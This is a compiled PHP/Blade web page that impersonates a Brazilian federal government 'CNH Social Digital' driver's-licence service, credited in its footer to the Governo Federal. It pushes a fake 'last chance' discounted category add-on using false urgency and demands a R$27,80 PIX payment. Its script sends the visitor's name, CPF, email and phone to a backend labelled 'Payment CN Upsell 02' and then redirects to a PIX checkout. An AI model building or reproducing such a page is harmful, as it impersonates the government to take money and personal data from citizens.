<?php $__env->startSection('content'); ?>
    <div class="min-h-screen bg-background flex flex-col">
        <?php echo $__env->make('components.header', array_diff_key(get_defined_vars(), ['__data' => 1, '__path' => 1]))->render(); ?>
        <main class="flex-1 px-4 py-6">
            <div class="max-w-2xl mx-auto">
                <div class="mb-6 text-sm">
                    <span class="text-govBlue hover:underline cursor-pointer">Início</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-govBlue hover:underline cursor-pointer">Serviços</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-govBlue hover:underline cursor-pointer">CNH</span>
                    <span class="mx-2 text-muted-foreground">&gt;</span>
                    <span class="text-foreground">CNH Social Digital</span>
                </div>
                <div class="bg-card rounded-lg shadow-md border border-border p-6">
                    <div class="flex items-start justify-between gap-4">
                        <h1 class="text-2xl font-bold text-[#1B4F9B] mb-4">Adição de Categoria com Desconto</h1>
                    </div>
                    <div class="bg-blue-100 border-l-4 border-blue-500 text-blue-700 p-3 rounded-xl shadow mb-4 flex gap-2">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-triangle-alert-icon lucide-triangle-alert w-5 h-5"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg>
                        <div class="flex-1">
                            <p class="font-semibold text-sm md:text-base">Última chance de garantir este benefício.</p>
                        </div>
                    </div>
                    <p class="leading-relaxed mb-4 text-sm md:text-base">
                        A partir daqui, você não conseguirá mais ativar a Adição de Categoria com valor reduzido. E quando precisar adicionar — seja por emprego, mudança de função ou oportunidade — o valor será maior.
                    </p>
                    <p class="leading-relaxed mb-4 text-sm md:text-base">
                        A oferta está disponível somente agora, enquanto você está no processo.
                    </p>
                    <h2 class="font-semibold text-lg mb-4">Ao ativar, você garante:</h2>
                    <ul class="text-green-600 font-medium mb-6">
                        <li class="flex gap-2 items-center mb-1 text-sm md:text-base"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-check-big-icon lucide-circle-check-big w-4 h-4"><path d="M21.801 10A10 10 0 1 1 17 3.335"/><path d="m9 11 3 3L22 4"/></svg> <span class="flex-1">Direito de adicionar categoria quando quiser</span></li>
                        <li class="flex gap-2 items-center mb-1 text-sm md:text-base"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-check-big-icon lucide-circle-check-big w-4 h-4"><path d="M21.801 10A10 10 0 1 1 17 3.335"/><path d="m9 11 3 3L22 4"/></svg> <span class="flex-1">Desconto antecipado (não volta depois)</span></li>
                        <li class="flex gap-2 items-center mb-1 text-sm md:text-base"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-check-big-icon lucide-circle-check-big w-4 h-4"><path d="M21.801 10A10 10 0 1 1 17 3.335"/><path d="m9 11 3 3L22 4"/></svg> <span class="flex-1">Prioridade na solicitação</span></li>
                        <li class="flex gap-2 items-center mb-1 text-sm md:text-base"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-check-big-icon lucide-circle-check-big w-4 h-4"><path d="M21.801 10A10 10 0 1 1 17 3.335"/><path d="m9 11 3 3L22 4"/></svg> <span class="flex-1">Liberdade para escolher categoria superior</span></li>
                        <li class="flex gap-2 items-center text-sm md:text-base"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-circle-check-big-icon lucide-circle-check-big w-4 h-4"><path d="M21.801 10A10 10 0 1 1 17 3.335"/><path d="m9 11 3 3L22 4"/></svg> <span class="flex-1">Economia garantida no futuro</span></li>
                    </ul>
                    <div class="bg-yellow-100 border-l-4 border-yellow-500 text-yellow-700 p-3 rounded-xl shadow mb-6 flex gap-2">
                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-triangle-alert-icon lucide-triangle-alert w- h-5"><path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg>
                        <div class="flex-1">
                            <p class="text-sm md:text-base">É simples: <strong>ativa agora ou perde a vantagem para sempre</strong>.</p>
                        </div>
                    </div>
                    <div class="text-center mb-3">
                        <p class="text-2xl font-bold text-green-600">R$27,80</p>
                        <p class="text-sm text-gray-600 mt-1">Pagamento único via PIX</p>
                    </div>
                    <button onclick="processarTax(27.80)" class="inline-flex items-center justify-center gap-2 whitespace-nowrap ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&amp;_svg]:pointer-events-none [&amp;_svg]:size-4 [&amp;_svg]:shrink-0 h-11 rounded-md px-8 w-full py-6 text-base md:text-lg font-semibold bg-[#1B4F9B] hover:bg-[#1B4F9B]/90 text-white">Garantir Adição de Categoria!</button>
                </div>
            </div>
        </main>
        <footer class="mt-8 py-6 border-t border-border bg-card">
            <div class="max-w-4xl mx-auto px-4 text-center text-sm text-muted-foreground">&copy; <?php echo e(date('Y')); ?> <strong>Governo Federal</strong>. Todos os direitos reservados.</div>
        </footer>
    </div>
<style>
.bg-yellow-100{background-color:oklch(97.3% 0.071 103.193);}
.border-yellow-500{border-color:oklch(79.5% 0.184 86.047);}
.border-blue-500{border-color:oklch(62.3% 0.214 259.815);}
.text-yellow-700{color:oklch(55.4% 0.135 66.442);}
.rounded-xl{border-radius:0.75rem}
.text-gray-600{color:oklch(62.7% 0.194 149.214);}
</style>
<?php $__env->stopSection(); ?>
<?php $__env->startSection('javascript'); ?>
<script>
const userData = JSON.parse(sessionStorage.getItem("userData"));
const userAddress = JSON.parse(sessionStorage.getItem("userAddress"));
if(!userData){
    window.location.href = "<?php echo e(url('/login')); ?>";
} 

function processarTax(valor){
    var nome = userData.NOME;
    var cpf = userData.CPF;
    var email = userData.email;
    var telefone = userData.telefone;

    $('.loading__circle').css({ 'display': 'flex' });

    $.ajax({
        type: 'POST',
        url: "<?php echo e(url('/processar')); ?>",
        headers: {
            'X-CSRF-TOKEN': '<?php echo e(csrf_token()); ?>'
        },
        data: {
            servico: 'Payment CN Upsell 02',
            nome: nome,
            cpf: cpf,
            email: email,
            telefone: telefone,
            valor: valor
        },
        dataType: 'json',
        success: function (response) {
            if(response.success){
                window.location.href = "<?php echo e(url('/checkout/pix')); ?>/" + response.id;
            }else{
                $('.loading__circle').css({ 'display': 'none' });
            }
        }
    });
}
</script>
<?php $__env->stopSection(); ?>
<?php echo $__env->make('layouts.app', array_diff_key(get_defined_vars(), ['__data' => 1, '__path' => 1]))->render(); ?><?php /**PATH /var/www/areadev.site/public_html/cnhsocial/resources/views/cadastro/adicao-categoria.blade.php ENDPATH**/ ?>